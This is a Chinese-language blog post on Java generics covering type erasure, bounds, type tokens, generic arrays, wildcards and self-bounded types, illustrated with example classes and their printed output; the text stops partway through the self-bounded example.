&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/201903/1099419-20190304203825964-157263350.png&quot; width=&quot;600&quot; height=&quot;480&quot;/&gt;&lt;/p&gt;
&lt;p&gt;边界&amp;lt;T extends HasF&amp;gt;声明T必须具有类型HasF或者从HasF导出的类型。如果创建对象时符合这个要求，那么就可以安全地在obj上调用f()。&lt;/p&gt;
&lt;p&gt;泛型类类型参数将擦除到它的第一个边界（它可能会有多个边界）。编译器实际上会将类型参数替换为它的擦除。上面的例子中，T擦除到了HasF，就好像是在类的声明中使用了HasF替换了T一样。&lt;/p&gt;
&lt;p&gt;在这个例子中，其实泛型的作用没有多大我们其实可以使用以下代码代替以上泛型。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Manipulator{
    private HasF obj;
    public Manipulator(HasF x) { obj = x; }
    public void manipulate(){ obj.f(); }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;所以，只有我们希望代码跨多个类工作时，使用泛型才有所帮助。&lt;/p&gt;
&lt;h3 id=&quot;擦除的原因迁移兼容性&quot;&gt;擦除的原因——迁移兼容性&lt;/h3&gt;
&lt;p&gt;泛型类型只有在静态类型检查期间才出现，在此之后，程序中所有泛型类型都将被擦除，替换为它们的非泛型上界。例如，List&amp;lt;T&amp;gt;将被擦除为List，普通的类型变量在未指定边界的情况下将被擦除为Object类型。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;擦除的核心动机是它可以使得泛化的客户端可以使用非泛化的类库，反之亦然，这常被称为“迁移兼容性”。允许非泛型代码与泛型代码共存，擦除使得这种向泛型的迁移称为可能&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;边界处的检查与转型&quot;&gt;边界处的检查与转型&lt;/h3&gt;
&lt;p&gt;因为有了擦除，在程序运行过程中，泛型类中的泛型类型将不会有任何意义&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class ArrayMaker&amp;lt;T&amp;gt; {
    private Class&amp;lt;T&amp;gt; kind;
    public ArrayMaker(Class&amp;lt;T&amp;gt; kind) {
        this.kind = kind;
    }
    
    @SuppressWarnings(&quot;unchecked&quot;)
    T[] create(int size) {
        return (T[]) Array.newInstance(kind, size);
    }
    
    public static void main(String[] args) {
        ArrayMaker&amp;lt;String&amp;gt; stringMaker = new ArrayMaker&amp;lt;&amp;gt;(String.class);
        String[] stringArray = stringMaker.create(10);
        System.out.println(Arrays.toString(stringArray));
    }
}
/*
output:
[null, null, null, null, null, null, null, null, null, null]
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Array.newInstance()实际上没有拥有kind所蕴含的类型信息，所含有的类型信息为Object，向上例代码强转后，也没有得到令人满意的结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/201903/1099419-20190304203944517-1157902009.png&quot; width=&quot;600&quot; height=&quot;200&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但是看下面在这个例子，往返回泛型类型对象之前，向其中添加一些信息，会不会得到令人满意的结果&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class FilledListMaker&amp;lt;T&amp;gt; {
    
    List&amp;lt;T&amp;gt; create(T t, int n){
        List&amp;lt;T&amp;gt; result = new ArrayList&amp;lt;T&amp;gt;();
        for(int i=0; i&amp;lt;n; i++) {
            result.add(t);
        }
        return result;
    }
    
    public static void main(String[] args) {
        FilledListMaker&amp;lt;String&amp;gt; stringMaker = new FilledListMaker&amp;lt;&amp;gt;();
        List&amp;lt;String&amp;gt; list = stringMaker.create(&quot;Hello&quot;, 4);
        System.out.println(list);
    }
}
/*
output:
[Hello, Hello, Hello, Hello]
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从代码中我们可以看出，即使编译器无法知道有关create()中T的任何信息，但是它仍旧可以在编译时期确保你放置到result中的对象具有T类型，使其适合ArrayList&amp;lt;T&amp;gt;。因此，&lt;strong&gt;即使擦除在方法或类内部移除了有有关实际类型的信息，编译器仍旧可以确保方法或类使用的类型的内部一致性&lt;/strong&gt;。那么该如何确保呢？&lt;/p&gt;
&lt;p&gt;因为擦除在方法体中移除了类型信息，所以&lt;strong&gt;在运行时的问题就是边界：对象进入和离开方法的地点&lt;/strong&gt;。（此边界和类型参数的边界不同）&lt;strong&gt;这些正是编译器在编译期执行类型检查并插入转型代码的地点&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&quot;擦除的补偿类型标签&quot;&gt;擦除的补偿——类型标签&lt;/h2&gt;
&lt;h3 id=&quot;泛型类中创建泛型类型对象不成功&quot;&gt;泛型类中创建泛型类型对象不成功&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/201903/1099419-20190304204054403-1293637810.png&quot; width=&quot;600&quot; height=&quot;300&quot;/&gt;&lt;/p&gt;
&lt;p&gt;因为擦除会丢失确切信息，所以在运行时需要知道确切类型信息的操作都将无法完成。但是，我们可以引入&lt;code&gt;类型标签&lt;/code&gt;来暂时避免这种问题，对擦除机制进行补偿。类型标签就是可以用来表示当前类型的对象。我们可以在方法中显示传递类型的Class对象，以便在我们需要使用确切类型机制时使用。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Building {}
class House extends Building {}

public class ClassTypeCapture&amp;lt;T&amp;gt; {
    Class&amp;lt;T&amp;gt; kind;
    //引入类型标签 
    public ClassTypeCapture(Class&amp;lt;T&amp;gt; kind) {
        this.kind = kind;
    }
    public boolean f(Object arg) {
        return kind.isInstance(arg);
    }
    public static void main(String[] args) {
         ClassTypeCapture&amp;lt;Building&amp;gt; ctc = new ClassTypeCapture&amp;lt;&amp;gt;(Building.class);
         System.out.println(ctc.f(new Building()));
         System.out.println(ctc.f(new House()));
         
         ClassTypeCapture&amp;lt;House&amp;gt; ctc2 = new ClassTypeCapture&amp;lt;&amp;gt;(House.class);
         System.out.println(ctc2.f(new Building()));
         System.out.println(ctc2.f(new House()));
    }
}
/*
output:
true
true
false
true
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们引入类型标签（即传入Class对象）后，便可以使用动态的&lt;strong&gt;isInstance()&lt;/strong&gt;方法。我们需要注意&lt;strong&gt;，编译器会确保类型标签可以匹配泛型参数&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;创建泛型类型实例&quot;&gt;创建泛型类型实例&lt;/h3&gt;
&lt;p&gt;在Erased.java中出现如下错误：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;T var = new T();    // Cannot instantiate the type T&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;部分&lt;strong&gt;原因是因为擦除，而另一部分原因是因为编译器不能验证T具有默认无参构造器&lt;/strong&gt;。&lt;strong&gt;Java中想要在泛型类中创建类的实例的解决方案便是传入一个工厂对象，并使用它来创建实例&lt;/strong&gt;。&lt;strong&gt;&lt;span&gt;最便利的工厂对象就是Class对象&lt;/span&gt;&lt;/strong&gt;，因此使用Class对象作为类型标签传入，那么就可以使用&lt;strong&gt;newInstance()&lt;/strong&gt;来创建这个类型的对象。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class ClassAsFactory&amp;lt;T&amp;gt;{
    T x;
    public ClassAsFactory(Class&amp;lt;T&amp;gt; kind) {
        try {
            x = kind.newInstance();     //创建T类型的实例
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}

class Employee{}

public class InstantiateGenericType {
    public static void main(String[] args) {
        
        ClassAsFactory&amp;lt;Employee&amp;gt; fe = new ClassAsFactory&amp;lt;&amp;gt;(Employee.class);
        System.out.println(&quot;ClassAsFactory&amp;lt;Employee&amp;gt; succeeded.&quot;);
        
        try {
            ClassAsFactory&amp;lt;Integer&amp;gt; fi = new ClassAsFactory&amp;lt;&amp;gt;(Integer.class);
        } catch (Exception e) {
            System.out.println(&quot;ClassAsFactory&amp;lt;Integer&amp;gt; failed.&quot;);
        }
    }
}
/*
output:
ClassAsFactory&amp;lt;Employee&amp;gt; succeeded.
ClassAsFactory&amp;lt;Integer&amp;gt; failed.
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;代码可以编译，但是创建Integer的实例却会失败，是因为Integer没有任何默认的构造器。这个错误不会再编译时发现，而是在运行时捕获。所以Sun的工程师们建议&lt;strong&gt;使用&lt;span&gt;显示的工厂&lt;/span&gt;，并限制其类型，只能接受实现了这个工厂的类&lt;/strong&gt;。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//工厂接口
interface Factory&amp;lt;T&amp;gt;{
    T create();
}
//Integer工厂
class IntegerFactory implements Factory&amp;lt;Integer&amp;gt;{
    public Integer create() {
        return new Integer(7);
    }
}

class OtherClass{
    //静态内部类工厂创建外部类对象
    public static class FactoryOther implements Factory&amp;lt;OtherClass&amp;gt;{
        public OtherClass create() {
            return new OtherClass();
        }
        
    }
}
//生成泛型类型对象
class GenericFactory&amp;lt;T&amp;gt; {
    T x;
    public &amp;lt;F extends Factory&amp;lt;T&amp;gt;&amp;gt; GenericFactory(F factory) {
        x = factory.create();
    }
    //....
}

public class FactoryConstraint {
    public static void main(String[] args) {
        new GenericFactory(new IntegerFactory());
        new GenericFactory(new OtherClass.FactoryOther());
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;传入显示工厂的方法只是传入Class&amp;lt;T&amp;gt;的一种变体。实际上，两种方法都传递了工厂对象，Class&amp;lt;T&amp;gt;碰巧是內建的工厂。显示的工厂对象可以使我们获得编译时期的检查。&lt;/p&gt;
&lt;p&gt;还有一种创建泛型类型对象的方法便是&lt;code&gt;模板设计模式&lt;/code&gt;。下面示例中，create()是模板方法，create()在子类中定义，用来产生子类类型的对象。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;abstract class GenericWithCreate&amp;lt;T&amp;gt;{
    final T element;
    public GenericWithCreate() {
        element = create();
    }
    abstract T create();
}

class Tree{}

class Creator extends GenericWithCreate&amp;lt;Tree&amp;gt;{
    Tree create() {
        return new Tree();
    }
    
    void f() {
        System.out.println(element.getClass().getSimpleName());
    }
}

public class CreatorGeneric {
    public static void main(String[] args) {
        Creator creator = new Creator();
        creator.f();
    }
}
/*
output:
Tree
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;创建泛型数组&quot;&gt;创建泛型数组&lt;/h3&gt;
&lt;p&gt;正如在Erased.java中看见的不可以创建泛型数组&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;T[] array1 = new T[SIZE]; // Cannot create a generic array of T&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;一般的解决方案是在任何想要创建泛型数组的地方都使用ArrayList:&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class ListOfGenerics &amp;lt;T&amp;gt; {
    private List&amp;lt;T&amp;gt; array = new ArrayList&amp;lt;T&amp;gt;();
    public void add(T item){ array.add(item);}
    public T get(int index) { return array.get(index);}
} &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;若是真想创建一个泛型数组，那么唯一的方式就是创建一个被擦除类型的新数组，然后对其转型。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class GenericArray &amp;lt;T&amp;gt; {
    private T[] array;

    @SuppressWarnings(&quot;unchecked&quot;)
    public GenericArray(int size) {
//      array = new T[size];    //Cannot create a generic array of T
        array = (T[]) new Object[size];
    }
    
    public void put(int index, T item) {
        array[index] = item;
    }
    
    public T get(int index) {
        System.out.println(&quot;array[index].getClass().getSimpleName() = &quot; + array[index].getClass().getSimpleName());
        return array[index];
    }
    
    public T[] rep() {
        System.out.println(&quot;array.getClass().getSimpleName() = &quot; + array.getClass().getSimpleName());
        return array;
    }
    
    public static void main(String[] args) {
        GenericArray&amp;lt;Integer&amp;gt; ga = new GenericArray&amp;lt;&amp;gt;(10);
        
//      java.lang.ClassCastException: [Ljava.lang.Object; cannot be cast to [Ljava.lang.Integer;
//      Integer[] ia = (Integer[])ga.rep();
        
        ga.put(0, 1);
        ga.get(0);
        Object[] oa = ga.rep();
    }
}
/*
output:
array[index].getClass().getSimpleName() = Integer
array.getClass().getSimpleName() = Object[]
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们不能创建array = new T[size];，所以我们创建了一个对象数组，并将其转型。rep()方法返回的是T[]，那么在main()中，按理说会返回Integer[]，但是却出现ClassCastException，这只能说明&lt;strong&gt;程序实际运行时，数组的类型为Object&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;因为有了擦除，数组运行时的类型就只能是Object。如果我们立即将其转型为T[]，那么在编译期该数组的类型就会丢失，而编译器可能会错过某些潜在的错误检查。正是因为这样，最好在集合内部就使用Object[]，然后使用数组元素时再添加一个对T的转型。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class GenericArray2&amp;lt;T&amp;gt; {
    private Object[] array;
    
    public GenericArray2(int size) {
        array = new Object[size];
    }
    
    public void put(int index, T item) {
        array[index] = item;
    }
    
    @SuppressWarnings(&quot;unchecked&quot;)
    public T get(int index) {
        System.out.println(&quot;array[index].getClass().getSimpleName() = &quot;+ array[index].getClass().getSimpleName());
        return (T) array[index];
    }
    
    @SuppressWarnings(&quot;unchecked&quot;)
    public T[] rep() {
        System.out.println(&quot;array.getClass().getSimpleName() = &quot;+ array.getClass().getSimpleName());
        return (T[]) array;
    }
    
    public static void main(String[] args) {
        GenericArray2&amp;lt;Integer&amp;gt; ga2 = new GenericArray2&amp;lt;&amp;gt;(5);
        ga2.put(0, 7);
        ga2.get(0);
        try {
            Integer[] ia = ga2.rep();
        } catch (Exception e) {
            System.out.println(e);
        }
    }
}
/*
array[index].getClass().getSimpleName() = Integer
array.getClass().getSimpleName() = Object[]
java.lang.ClassCastException: [Ljava.lang.Object; cannot be cast to [Ljava.lang.Integer;
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在调用rep()时，尝试将Object[]转换为T[]，是不正确的。因此，没有任何方式推翻底层的数组类型，它只能是Object[]。将内部数组类型作为Object而不是T[]，是使我们可以随时记着泛型类中数组运行时的类型为Object。&lt;/p&gt;
&lt;p&gt;其实，&lt;strong&gt;我们真正要创建泛型数组，应该要想创建泛型类对象一样，传入一个类型参数（类型标记）&lt;/strong&gt;。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class GenericArrayWithTypeToken &amp;lt;T&amp;gt;{
    private T[] array;
    
    @SuppressWarnings(&quot;unchecked&quot;)
    public GenericArrayWithTypeToken(Class&amp;lt;T&amp;gt; type, int size) {
        array = (T[]) Array.newInstance(type, size);
    }
    
    public void put(int index, T item) {
        array[index] = item;
    }
    
    public T get(int index) {
        return array[index];
    }
    
    public T[] rep() {
        System.out.println(&quot;array.getClass().getSimpleName() = &quot;+ array.getClass().getSimpleName());
        return array;
    }
    
    public static void main(String[] args) {
        GenericArrayWithTypeToken&amp;lt;Integer&amp;gt; ga = new GenericArrayWithTypeToken&amp;lt;&amp;gt;(Integer.class, 7);
        Integer[] ia = ga.rep();
    }
}
/*
output:
array.getClass().getSimpleName() = Integer[]
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;类型标记Class&amp;lt;T&amp;gt;被传入到构造器中，以便从擦除中恢复，使得我们可以创建需要的实际类型的数组。&lt;/p&gt;
&lt;h2 id=&quot;边界&quot;&gt;边界&lt;/h2&gt;
&lt;p&gt;我们在“定义擦除的边界”那儿提到了边界。边界使得我们可以在泛型的类型参数上设置限制条件：可以强制泛型可以应用的类型，以及可以按照自己的边界来调用方法。　　　&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因为擦除机制移除了类型信息，所以若是没有给类型参数指定边界，那么调用的方法就只能是Object的方法。若是将类型参数限制为某个类的子集，那么我们就用这些子集来调用这个类的方法&lt;/strong&gt;。为了执行这种限制，Java泛型重用了&lt;code&gt;extends&lt;/code&gt;关键字（需要注意与继承关系中的含义区分）。&lt;/p&gt;
&lt;p&gt;下面示例展示了边界的基本要素：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;import java.awt.Color;

interface HasColor {
    java.awt.Color getColor();
}

class Colored &amp;lt;T extends HasColor&amp;gt;{
    T item;
    public Colored( T item) { this.item = item; }
    T getItem() {return item;}
    //有了边界 允许调用getColor()方法
    Color color(){ return item.getColor();}
}

class Dimension { public int x, y, z;}

//多边界 类要放在第一个 接口放在后面
//class ColoredDimension&amp;lt;T extends HasColor &amp;amp; Dimension&amp;gt; 
class ColoredDimension &amp;lt;T extends Dimension &amp;amp; HasColor&amp;gt;{
    //...
}

interface Wight{int wight();}

//拥有多个边界的泛型类  多边界只能有一个具体类  但是可以有多个接口
class Solid &amp;lt;T extends Dimension &amp;amp; HasColor &amp;amp; Wight&amp;gt;{
    T item;
    public Solid(T item) { this.item = item; }
    T getItem() { return item;}
    Color color(){ return item.getColor();}
    int getX() {return item.x; }
    int getY() {return item.y; }
    int getZ() {return item.z; }
    int weight() {return item.wight(); }
}

class Bounded extends Dimension implements HasColor, Wight{
    public int wight() { return 0; }
    public Color getColor() { return null;}
}

public class BasicBounds {
    public static void main(String[] args) {
        Solid&amp;lt;Bounded&amp;gt; solid = new Solid&amp;lt;&amp;gt;(new Bounded());
        solid.color();
        solid.getX();
        solid.weight();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;泛型类的类型参数被限制为多边界时，具体类要放在第一个，接口放在后面&lt;/li&gt;
&lt;li&gt;多边界时，具体类只能有一个，可以有多个接口&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;通配符&quot;&gt;通配符&lt;/h2&gt;
&lt;p&gt;在介绍通配符之前，我们先举一个关于数组的特殊例子：使用基类的引用指向子类的对象，将导致一些问题&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Fruit{}
class Apple extends Fruit{}
class Jonathan extends Apple{}
class Orange extends Fruit{}

public class CovriantArrays {
    public static void main(String[] args) {
        Fruit[] fruit = new Apple[10];
        fruit[0] = new Apple();
        fruit[1] = new Jonathan();
        
        try {
            fruit[2] = new Fruit(); 
        }catch (Exception e) {
            System.out.println(e);
        }
        
        try {
            fruit[3] = new Orange();
        } catch (Exception e) {
            System.out.println(e);
        }
        
        System.out.println(fruit.getClass().getSimpleName());
    }
}
/*
java.lang.ArrayStoreException: blogTest.Fruit
java.lang.ArrayStoreException: blogTest.Orange
Apple[]
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们将Apple数组赋值给Fruit数组，是因为Apple也是一种Fruit。我们将Fruit放到Fruit数组中，这是被编译器允许的，因为引用类型就是Fruit。向Fruit中添加Orange也是被允许的，因为Orange也是一种Fruit。虽然在编译时期，这种赋值是被允许的，但是在运行时期却抛出了异常。原因是因为，&lt;strong&gt;运行时期数组机制知道它处理的是Apple[]，添加除Apple以及Apple子类之外的对象都是不允许的&lt;/strong&gt;。&lt;strong&gt;数组对象可以保留它们包含的对象类型的规则&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对数组的这种赋值，将在运行时期才可以看出错误。但是泛型的主要目标之一就是将这种错误检查移入到编译期&lt;/strong&gt;！当我们使用泛型容器代替以上数组时：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/201903/1099419-20190304204209071-1190551456.png&quot; width=&quot;600&quot; height=&quot;200&quot;/&gt;&lt;/p&gt;
&lt;p&gt;编译时的报错信息为：不能将一个Apple容器赋值给一个Fruit容器。但是更准确的说法是：不能将一个涉及Apple的泛型赋值给一个涉及Fruit的泛型。&lt;/p&gt;
&lt;p&gt;我们讨论的是容器的类型，不是容器持有的类型，所以Apple的List不是Fruit的List。与数组不同，泛型没有內建的协变类型。数组中Apple可以赋值给Fruit，是因为编译器知道Apple是Fruit的协变类型，因此可以向上转型。&lt;strong&gt;泛型中，若是想在两个类之间建立类似这种向上转型的关系，就需要使用通配符&lt;/strong&gt;（即类型参数中的？）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/201903/1099419-20190304204307907-1946033160.png&quot; width=&quot;600&quot; height=&quot;480&quot;/&gt;&lt;/p&gt;
&lt;p&gt;List&amp;lt;? extends Fruit&amp;gt;可以理解为：具有任何从Fruit继承的类型的列表。这样的List持有的类型将是不稳定的，编译器无法确保可以安全地向其中添加对象。&lt;/p&gt;
&lt;p&gt;返回一个Fruit则是安全的，因为列表中存的就是Fruit或者其子类。&lt;/p&gt;
&lt;p&gt;查看List的实现源码，我们可以发现&lt;span&gt;add()的参数会变成? extends Fruit&lt;/span&gt;，因此编译器不能知道需要Fruit的哪个子类型，因此它不会接受任何的Fruit。&lt;span&gt;&lt;strong&gt;编译器将直接拒绝对参数列表中涉及通配符的方法的调用（例如add()）&lt;/strong&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;超类型通配符&quot;&gt;超类型通配符&lt;/h3&gt;
&lt;p&gt;若是我们想向基类型列表中写入子类型，完成上述add()方法的功能，那么我们可以使用&lt;code&gt;超类型通配符&lt;/code&gt;。这里，可以声明通配符是由某个特定类的任何基类来界定的，方法是指定&lt;strong&gt;&amp;lt;? super MyClass&amp;gt;&lt;/strong&gt; 或者使用类型参数&lt;strong&gt;&amp;lt;? super T&amp;gt;&lt;/strong&gt;（但是不能对泛型类型参数给出一个超类型边界，即不能声明&amp;lt;T super MyClass&amp;gt;）。这样，我们便可以安全地传递一个类型对象到泛型类型中。因此，有了超类型通配符，我们可以做如下插入：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class SuperTypeWildcards{
    static void writeTo(List&amp;lt;? super Apple&amp;gt; apples){
        apples.add(new Apple());
        apples.add(new Jonathan());
        // apples.add(new Fruit()); //Error
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们可以向apples中添加Apple或者Apple的子类型是安全的。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;超类型边界放松了在可以向方法传递参数上所做的限制&lt;/strong&gt;！&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class GenericWriting {
    
    static List&amp;lt;Apple&amp;gt; apples = new ArrayList&amp;lt;Apple&amp;gt;();
    static List&amp;lt;Fruit&amp;gt; fruits = new ArrayList&amp;lt;Fruit&amp;gt;();
    
    static &amp;lt;T&amp;gt; void writeExact(List&amp;lt;T&amp;gt; list, T item) {
        System.out.println(item.getClass().getSimpleName());
        list.add(item);
    }
    
    //在“精确”类型下 也可以向fruit中添加对象
    static void f1() {
        writeExact(fruits, new Fruit());
        writeExact(fruits, new Apple());
        writeExact(fruits, new Orange());
//      writeExact(fruits, new Object()); //Error
    }
    
    static &amp;lt;T&amp;gt; void writeWithWildcard(List&amp;lt;? super T&amp;gt; list, T item) {
        System.out.println(item.getClass().getSimpleName());
        list.add(item);
    }
    
    static void f2() {
        writeWithWildcard(fruits, new Fruit());
        writeWithWildcard(fruits, new Apple());
        writeWithWildcard(fruits, new Orange());
//      writeWithWildcard(fruits, new Object()); //Error
    }
    
    public static void main(String[] args) {
        f1();
        System.out.println(&quot;--------------&quot;);
        f2();
    }
}
/*
output:
Fruit
Apple
Orange
--------------
Fruit
Apple
Orange
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Java编写思想中&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;writeExact(fruits, new Apple());或者 writeExact(fruits, new Orange());&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;在“精确”类型中是不可以向列表中添加的，然而在JDK 1.8上运行，确实是可以添加的。看来是做了优化？还是我理解理解错了？这里暂时有点迷惑。望各位看官解答。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;我们在做一个相同的联系，对协变和通配符做一个复习，也与超类型通配符比较下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class GenericReading {
    
    //Arrays.asList()生成大小不可变的列表
    static List&amp;lt;Apple&amp;gt; apples = Arrays.asList(new Apple());
    static List&amp;lt;Fruit&amp;gt; fruits = Arrays.asList(new Fruit());
    
    //使用“精确”的泛型
    static class Reader&amp;lt;T&amp;gt; {
        T readExact(List&amp;lt;T&amp;gt; list) {
            System.out.println(list.get(0).getClass().getSimpleName());
            return list.get(0);
        }
    }
    
    static void f1() {
        Reader&amp;lt;Fruit&amp;gt; fruitReader = new Reader&amp;lt;Fruit&amp;gt;();
        Fruit f = fruitReader.readExact(fruits);
//      Fruit a = fruitReader.readExact(apples);   //Error
    }
    
    //协变
    static class CovariantReader&amp;lt;T&amp;gt; {
        //可以接受T类型或者是T导出的类型
        T readCovariant(List&amp;lt;? extends T&amp;gt; list) {
            System.out.println(list.get(0).getClass().getSimpleName());
            return list.get(0);
        }
    }
    
    static void f2() {
        CovariantReader&amp;lt;Fruit&amp;gt; fReader = new CovariantReader&amp;lt;&amp;gt;();
        Fruit f = fReader.readCovariant(fruits);
        Fruit a = fReader.readCovariant(apples);
    }
    
    public static void main(String[] args) {
        f1();
        System.out.println(&quot;---&quot;);
        f2();
    }
}
/*
output:
Fruit
---
Fruit
Apple
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;个人的理解，&lt;span&gt;&amp;lt;? extends T&amp;gt; 常用于一个泛型类型中“读取”（从一个方法返回）；&amp;lt;? super T&amp;gt; 常用于向一个泛型类型“写入”（传递给一个方法）。&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;无界通配符&quot;&gt;无界通配符&lt;/h3&gt;
&lt;p&gt;无界通配符&amp;lt;?&amp;gt;表示具有某种特定类型，不过暂时还未知，与Object类型还是有区别的。&lt;/p&gt;
&lt;h2 id=&quot;自限定类型&quot;&gt;自限定类型&lt;/h2&gt;
&lt;p&gt;在Java泛型中，有这样一个奇怪的惯用法：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class SelfBounded&amp;lt;T extends SelfBounded&amp;lt;T&amp;gt;&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;SelfBounded将接受一个泛型参数T，这个T由一个边界限定，而这个边界就是拥有T作为其参数的SelfBounded。这样的使用方法一眼看去有点难以理解，我们看看下面的解释，就会理解这种用法的效果了。&lt;/p&gt;
&lt;h3 id=&quot;古怪的循环泛型&quot;&gt;古怪的循环泛型&lt;/h3&gt;
&lt;p&gt;为了理解自限定类型的含义，我们先从这个惯用法的一个简单版本入手，它没有包含自限定的边界（即 不包含extends SelfBounded&amp;lt;T&amp;gt;这句代码）。&lt;/p&gt;
&lt;p&gt;我们不能直接继承一个带有类型参数的泛型类，但是我们却被允许继承 &lt;strong&gt;将自己的类作为类型参数传给泛型类&lt;/strong&gt;的这种情况&lt;br/&gt;即：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class GenericType&amp;lt;T&amp;gt;{}
public class CuriouslyRecurringGeneric extends GenericType&amp;lt;CuriouslyRecurringGeneric&amp;gt;{}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们称这个为&lt;strong&gt;古怪的循环泛型（CRG）&lt;/strong&gt;来源C++中古怪的循环模板模式的命名方式。“古怪的循环”指的是当前类出现在基础的基类中。&lt;/p&gt;
&lt;p&gt;那么这个泛型基类有什么作用呢？&lt;/p&gt;
&lt;p&gt;我们可以产生 使用导出类作为泛型基类参数和泛型基类方法返回类型的 基类，还可以将导出类型作为基类的域类型，甚至那些将被擦除为Object的类型。 下面举例说明：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class BasicHolder&amp;lt;T&amp;gt;{
    T element;
    void set(T arg) {element = arg;}
    T get() {return element;}
    void f() {
        System.out.println(element.getClass().getSimpleName());
    }
}

class SubType extends BasicHolder&amp;lt;SubType&amp;gt;{}

public class CRGExample {
    public static void main(String[] args) {
        SubType t1 = new SubType();
        SubType t2 = new SubType();
        
        t1.set(t2);
        SubType t3 = t1.get();
        t1.f();
    }
}
/*
output:
SubType
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们需要注意：新类SubType接受的参数和返回的值具有SubType类型，而不仅仅是基类BasicHolder类型。&lt;strong&gt;所以CRG的核心在于：基类用导出类代替其参数&lt;/strong&gt;。可以说&lt;span&gt;泛型基类变成了一种其所有导出类的公共功能的模板，但是这些功能的所有参数和返回值将使用导出类型。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;但是BasicHolder可以使用任何类型作为其泛型参数，我们即将要介绍的&lt;strong&gt;自限定则可以强制将正在定义的类作为自己的边界参数使用&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;自限定&quot;&gt;自限定&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class SelfBounded&amp;lt;T extends SelfBounded&amp;lt;T&amp;gt;&amp;gt;{
    T element;
    public SelfBounded&amp;lt;T&amp;gt; set(T arg) {
        element = arg;
        return this;
    }
    
    public T get() {
        return element;
    }
}

class A extends SelfBounded&amp;lt;A&amp;gt;{}
class B extends SelfBounded&amp;lt;A&amp;gt;{}

class C extends SelfBounded&amp;lt;C&amp;gt;{
    C setAndGet(C arg) {
        set(arg);
        return get();
    }
}
